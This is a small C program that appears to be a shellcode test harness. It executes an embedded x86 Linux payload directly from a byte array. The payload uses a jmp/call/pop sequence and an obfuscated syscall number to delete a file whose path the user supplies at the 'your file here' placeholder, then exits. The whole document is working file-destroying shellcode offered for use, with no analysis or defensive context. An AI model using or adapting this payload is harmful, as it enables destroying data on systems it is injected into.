#include<stdio.h>
#include<string.h>

unsigned char payload[] = \
"\xeb\x0f\x5b\xb0\x07\x04\x05\x2c\x02\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xec\xff\xff\xff"
"\xaa\xbb\xcc\xdd";//your file here
;
main()
{
	printf("Payload Length:  %d\n", strlen(payload));
	int (*ret)() = (int(*)())payload;
	ret();
	return 0;
}